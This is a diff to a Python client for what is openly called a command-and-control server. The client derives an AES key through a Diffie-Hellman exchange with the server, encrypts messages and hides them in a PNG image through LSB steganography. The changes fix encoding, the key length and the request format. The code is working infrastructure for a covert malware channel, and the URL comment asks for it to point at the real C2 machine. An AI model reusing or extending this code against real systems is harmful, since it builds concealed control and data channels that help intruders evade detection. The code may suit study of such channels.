@@ -7,7 +7,6 @@ import time
 from diffiehellman import DiffieHellman
 
 
-#global_key = int("ffffffffffffffffffffffffffffffff", 16).to_bytes(16, "big")
 global_key = None
 
 url = "http://localhost:80/" #remember to change this to the actual IP address of machine running the C2 Server.
@@ -26,7 +25,7 @@ def encrypt(plain_str):
     plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
     encrypted = cipher.encrypt(plaintext)
     print(f"[*] Encrypted Message: {encrypted})")
-    return encrypted + cipher.iv
+    return (encrypted + cipher.iv).decode("latin-1")
 
 #Decryption of data 
 def decrypt(ciphertext): 
@@ -43,7 +42,7 @@ def decrypt(ciphertext):
 def mod_img(msg):
     path = "./images/"
     file_name = "safari-bird"
-    encoded_img = lsb.hide(f"{path}{file_name}.png", msg.decode("latin-1")) #we have to assume that we are in a writeable directory for this 
+    encoded_img = lsb.hide(f"{path}{file_name}.png", msg) #we have to assume that we are in a writeable directory for this 
     encoded_img.save(f"{path}{file_name}-final.png")
     #Error Checking: 
     print("[*] Revealed from image:")
@@ -86,19 +85,19 @@ def key_dist():
     response = requests.get(routes[2])
     response = response.json()
     server_public_key = response["key"].encode("latin-1")
+    #print(f"[+] Server public key: {server_public_key}")
 
     #sending generated public key 
     dh = DiffieHellman(group=14, key_bits=540)
     public_key = dh.get_public_key()
+    #print(f"[+] My public key: {public_key}")
     json_obj = {"key" : public_key.decode("latin-1")}
-    requests.post(routes[3], data=json_obj)
+    requests.post(routes[3], json=json_obj)
 
     #deriving shared AES key
-    global_key=dh.generate_shared_key(server_public_key)
+    global_key=dh.generate_shared_key(server_public_key)[:16]
     print(f"[+] Derived AES key: {global_key}")
     return 
-
-
 
 
 #Setting up initial connection with C2 Server
